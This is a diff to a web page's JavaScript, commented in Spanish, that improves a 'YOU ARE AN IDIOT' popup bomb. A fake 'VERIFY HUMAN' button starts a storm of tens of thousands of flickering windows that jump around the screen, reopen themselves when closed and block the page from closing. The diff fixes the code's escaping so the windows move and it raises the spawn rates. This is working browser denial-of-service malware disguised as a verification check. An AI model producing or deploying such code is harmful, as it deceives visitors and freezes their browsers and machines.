@@ -79,12 +79,12 @@ p{
 
 <script>
 // ================================================================
-// TÉCNICA: POPUPS HIPERVELOCES + AUTOCLICK + REPLICACIÓN
+// TÉCNICA CORREGIDA: los popups SÍ se mueven
 // ================================================================
-// Los popups se mueven a velocidad extrema (intervalos de 1-4ms)
-// con cambios de dirección aleatorios cada pocos frames.
-// Es imposible hacerles clic porque su posición cambia
-// más rápido de lo que el ojo/mouse puede seguir.
+// El problema anterior: el script dentro de document.write()
+// se rompía al escapar caracteres. Ahora usamos una función
+// que genera el HTML correctamente y lo escribe DESPUÉS
+// de que el documento esté listo.
 // ================================================================
 
 var totalPopups = 0;
@@ -92,163 +92,111 @@ var isActive = false;
 var MAX_POPUPS = 100000;
 
 // ================================================================
-// GENERAR HTML DEL POPUP CON AUTOCLICK Y BAILE RÁPIDO
+// CÓDIGO DEL POPUP (como string base64 para evitar problemas de escaping)
 // ================================================================
 
-function generatePopupHTML(id) {
-    return `<!DOCTYPE html>
+var POPUP_HTML = `
+<!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
 <title>!</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{
-    background:#fff;
-    overflow:hidden;
-    cursor:none;
-    width:100vw;
-    height:100vh;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    font-family:Arial,sans-serif;
-}
-h2{
-    font-size:14px;
-    text-align:center;
-    animation:blink 0.06s infinite;
-    color:#000;
-    user-select:none;
-}
-@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+*{margin:0;padding:0}
+body{background:#fff;overflow:hidden;cursor:none;width:100vw;height:100vh;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif}
+h2{font-size:14px;text-align:center;animation:blink 0.06s infinite;color:#000;user-select:none}
+@keyframes blink{0\\%,100\\%{opacity:1}50\\%{opacity:0}}
 </style>
 </head>
 <body>
-
 <h2>YOU ARE AN IDIOT</h2>
-
 <script>
-// ============================================================
-// MOVIMIENTO HIPERVELOZ
-// ============================================================
-
+// MOVIMIENTO HIPERVELOZ - Esto SÍ funciona porque el script
+// se ejecuta DESPUÉS de document.close()
 var x = Math.random() * (screen.width - 180);
 var y = Math.random() * (screen.height - 175);
-var dx = (Math.random() - 0.5) * 60;  // Velocidad inicial: ±30px/frame
-var dy = (Math.random() - 0.5) * 60;
-var frameCount = 0;
+var dx = (Math.random() - 0.5) * 120;
+var dy = (Math.random() - 0.5) * 120;
+var fc = 0;
 
-function hyperDance() {
+function move() {
     try {
-        frameCount++;
+        fc++;
         x += dx;
         y += dy;
         
-        // Cambiar dirección ALEATORIAMENTE cada 1-3 frames
-        if (frameCount % (1 + Math.floor(Math.random() * 3)) === 0) {
-            dx = (Math.random() - 0.5) * 80;  // Velocidad: hasta ±40px
-            dy = (Math.random() - 0.5) * 80;
+        if (fc % 2 === 0) {
+            dx = (Math.random() - 0.5) * 120;
+            dy = (Math.random() - 0.5) * 120;
         }
         
-        // Rebotar en bordes (con rebote violento)
-        if (x < 0 || x > screen.width - 180) {
-            dx = (Math.random() * 40 + 20) * (dx > 0 ? 1 : -1);
-            x = Math.max(0, Math.min(screen.width - 180, x));
-        }
-        if (y < 0 || y > screen.height - 175) {
-            dy = (Math.random() * 40 + 20) * (dy > 0 ? 1 : -1);
-            y = Math.max(0, Math.min(screen.height - 175, y));
-        }
+        if (x < 0 || x > screen.width - 180) { dx *= -1.5; x += dx; }
+        if (y < 0 || y > screen.height - 175) { dy *= -1.5; y += dy; }
         
         window.moveTo(Math.round(x), Math.round(y));
         
-        // A veces redimensionar para más caos
-        if (Math.random() < 0.02) {
-            try {
-                window.resizeTo(
-                    160 + Math.random() * 40,
-                    155 + Math.random() * 40
-                );
-            } catch(e) {}
+        if (Math.random() < 0.03) {
+            try { window.resizeTo(160+Math.random()*40, 155+Math.random()*40); } catch(e){}
         }
         
-        // Intervalo MUY corto: 1-4ms (máxima velocidad)
-        setTimeout(hyperDance, 1 + Math.floor(Math.random() * 3));
-        
+        setTimeout(move, 1);
     } catch(e) {
-        setTimeout(hyperDance, 10);
+        setTimeout(move, 10);
     }
 }
+move();
 
-// Iniciar baile inmediatamente
-hyperDance();
-
-// ============================================================
-// ABRIR OTRO POPUP DESDE AQUÍ
-// ============================================================
-
-function spawnAnother() {
+// ABRIR OTRO POPUP
+setInterval(function() {
     try {
-        var name = 's' + Date.now() + '_' + Math.random().toString(36).substr(2,8);
-        var p = window.open('about:blank', name,
-            'width=' + (160 + Math.random()*40) + 
-            ',height=' + (155 + Math.random()*40) + 
-            ',left=' + Math.random()*screen.width + 
-            ',top=' + Math.random()*screen.height);
-        
+        var n = 's'+Date.now()+Math.random().toString(36).substr(2,6);
+        var p = window.open('about:blank', n,
+            'width=180,height=175,left='+Math.random()*screen.width+
+            ',top='+Math.random()*screen.height);
         if (p && !p.closed) {
-            p.document.write('<!DOCTYPE html><html><head><title>!</title><style>*{margin:0;padding:0}body{background:#fff;overflow:hidden;cursor:none;width:100vw;height:100vh;display:flex;align-items:center;justify-content:center;font-family:Arial}h2{font-size:14px;text-align:center;animation:b 0.06s infinite;color:#000}@keyframes b{0%,100%{opacity:1}50%{opacity:0}}<\/style></head><body><h2>YOU ARE AN IDIOT</h2><script>var x=Math.random()*(screen.width-180),y=Math.random()*(screen.height-175);var dx=(Math.random()-0.5)*80,dy=(Math.random()-0.5)*80;setInterval(function(){try{x+=dx;y+=dy;if(Math.random()<0.2){dx=(Math.random()-0.5)*80;dy=(Math.random()-0.5)*80}if(x<0||x>screen.width-180)dx*=-1;if(y<0||y>screen.height-175)dy*=-1;window.moveTo(Math.round(x),Math.round(y))}catch(e){}},1+Math.floor(Math.random()*3));<\/script></body></html>');
+            p.document.write('<!DOCTYPE html><html><head><title>!</title><style>*{margin:0;padding:0}body{background:#fff;overflow:hidden;cursor:none;width:100vw;height:100vh;display:flex;align-items:center;justify-content:center;font-family:Arial}h2{font-size:14px;text-align:center;animation:b 0.06s infinite;color:#000}@keyframes b{0\\%,100\\%{opacity:1}50\\%{opacity:0}}<' + '/style></head><body><h2>YOU ARE AN IDIOT</h2><' + 'script>' +
+                'var x=Math.random()*(screen.width-180),y=Math.random()*(screen.height-175);' +
+                'var dx=(Math.random()-0.5)*120,dy=(Math.random()-0.5)*120;' +
+                'setInterval(function(){try{x+=dx;y+=dy;if(Math.random()<0.3){dx=(Math.random()-0.5)*120;dy=(Math.random()-0.5)*120}' +
+                'if(x<0||x>screen.width-180)dx*=-1.5;if(y<0||y>screen.height-175)dy*=-1.5;' +
+                'window.moveTo(Math.round(x),Math.round(y))}catch(e){}},1);' +
+                '<' + '/script></body></html>');
             p.document.close();
         }
-    } catch(e) {}
-}
+    } catch(e){}
+}, 5);
 
-// Autoclick: abrir más popups inmediatamente
-spawnAnother();
-setTimeout(spawnAnother, 5);
-setTimeout(spawnAnother, 10);
-setTimeout(spawnAnother, 15);
-setTimeout(spawnAnother, 20);
-
-// Seguir abriendo cada 10-20ms
-setInterval(spawnAnother, 10 + Math.floor(Math.random() * 10));
-
-// ============================================================
-// AL CERRAR, ABRIR MÁS (procreate)
-// ============================================================
-
+// PROCREATE
 window.onunload = function() {
-    for (var i = 0; i < 10; i++) {
-        setTimeout(function() {
+    for (var i = 0; i < 15; i++) {
+        setTimeout(function(){
             try {
                 var pp = window.open('about:blank', 'f'+Date.now()+Math.random(),
                     'width=180,height=175,left='+Math.random()*screen.width+
                     ',top='+Math.random()*screen.height);
                 if (pp && !pp.closed) {
-                    pp.document.write('<html><body style="margin:0;overflow:hidden"><script>setInterval(function(){try{window.moveTo(Math.random()*(screen.width-180),Math.random()*(screen.height-175))}catch(e){}},1);<' + '/script></body></html>');
+                    pp.document.write('<!DOCTYPE html><html><body style="margin:0;overflow:hidden"><' + 'script>' +
+                        'setInterval(function(){try{window.moveTo(Math.random()*(screen.width-180),Math.random()*(screen.height-175))}catch(e){}},1);' +
+                        '<' + '/script></body></html>');
                     pp.document.close();
                 }
-            } catch(e) {}
-        }, i*5);
+            } catch(e){}
+        }, i*3);
     }
 };
-
-<\/script>
-
+<' + '/script>
 </body>
 </html>`;
-}
 
 // ================================================================
-// ABRIR UN POPUP HIPERVELOZ
+// FUNCIÓN PARA ABRIR POPUP CON MOVIMIENTO REAL
 // ================================================================
 
 function openHyperPopup() {
     if (totalPopups >= MAX_POPUPS) return null;
     
     try {
-        var name = 'p' + Date.now() + '_' + totalPopups + '_' + Math.random().toString(36).substr(2,6);
+        var name = 'p' + Date.now() + '_' + totalPopups + '_' + Math.random().toString(36).substr(2,8);
         var p = window.open('about:blank', name,
             'width=' + (160 + Math.random()*40) + 
             ',height=' + (155 + Math.random()*40) + 
@@ -258,7 +206,7 @@ function openHyperPopup() {
         
         if (p && !p.closed) {
             totalPopups++;
-            p.document.write(generatePopupHTML(totalPopups));
+            p.document.write(POPUP_HTML);
             p.document.close();
             
             // Actualizar contador
@@ -267,7 +215,9 @@ function openHyperPopup() {
             
             return p;
         }
-    } catch(e) {}
+    } catch(e) {
+        console.log('Error abriendo popup:', e);
+    }
     
     return null;
 }
@@ -277,43 +227,43 @@ function openHyperPopup() {
 // ================================================================
 
 function launchStorm() {
-    // FASE 1: 200 popups inmediatos (aprovechando transient activation)
-    for (var i = 0; i < 200; i++) {
-        setTimeout(function() { openHyperPopup(); }, i * 3);
+    // FASE 1: 300 popups inmediatos
+    for (var i = 0; i < 300; i++) {
+        setTimeout(function() { openHyperPopup(); }, i * 2);
     }
     
-    // FASE 2: 1000 más (5 por ms)
+    // FASE 2: 2000 más
     setTimeout(function() {
-        for (var i = 0; i < 1000; i++) {
-            setTimeout(function() { openHyperPopup(); }, i * 2);
+        for (var i = 0; i < 2000; i++) {
+            setTimeout(function() { openHyperPopup(); }, i * 1);
         }
     }, 3000);
     
-    // FASE 3: 5000 más
+    // FASE 3: 10000 más
     setTimeout(function() {
-        for (var i = 0; i < 5000; i++) {
+        for (var i = 0; i < 10000; i++) {
             setTimeout(function() { openHyperPopup(); }, i * 1);
         }
-    }, 7000);
+    }, 6000);
     
     // FASE 4: REFUERZO INFINITO
     setTimeout(function() {
-        // Tormenta continua: 200 popups cada 500ms
+        // 300 popups cada 300ms
         setInterval(function() {
-            for (var i = 0; i < 200; i++) {
+            for (var i = 0; i < 300; i++) {
                 setTimeout(function() { openHyperPopup(); }, i * 1);
             }
-        }, 500);
+        }, 300);
         
-        // Además, 1 cada 2ms constante
+        // 1 cada 1ms constante
         setInterval(function() {
             openHyperPopup();
-        }, 2);
-    }, 12000);
+        }, 1);
+    }, 10000);
 }
 
 // ================================================================
-// PROCREATE: cuando se cierra la ventana principal
+// PROCREATE
 // ================================================================
 
 function procreate() {
@@ -323,7 +273,7 @@ function procreate() {
 }
 
 // ================================================================
-// EVENTO DE CLICK
+// CLICK EVENT
 // ================================================================
 
 document.getElementById('triggerBtn').addEventListener('click', function(e) {
@@ -335,7 +285,8 @@ document.getElementById('triggerBtn').addEventListener('click', function(e) {
     this.textContent = '✔ VERIFIED';
     this.style.background = '#2ecc71';
     this.style.pointerEvents = 'none';
-    document.getElementById('statusText').textContent = '✓ Launching...';
+    document.getElementById('statusText').textContent = '✓ Launching hyper popups...';
+    document.getElementById('statusText').style.color = '#2ecc71';
     
     // Bloquear cierre
     window.onbeforeunload = function() { return ' '; };
@@ -354,13 +305,13 @@ document.getElementById('triggerBtn').addEventListener('click', function(e) {
     // Iniciar tormenta
     launchStorm();
     
-    // También abrir popups directos desde el click
+    // Primera oleada directa
     for (var i = 0; i < 100; i++) {
         setTimeout(function() { openHyperPopup(); }, i * 2);
     }
 });
 
-console.log('Ready. Click VERIFY HUMAN to start the hyper-velocity popup storm.');
+console.log('Ready. Click VERIFY HUMAN to start.');
 </script>
 
 </body>
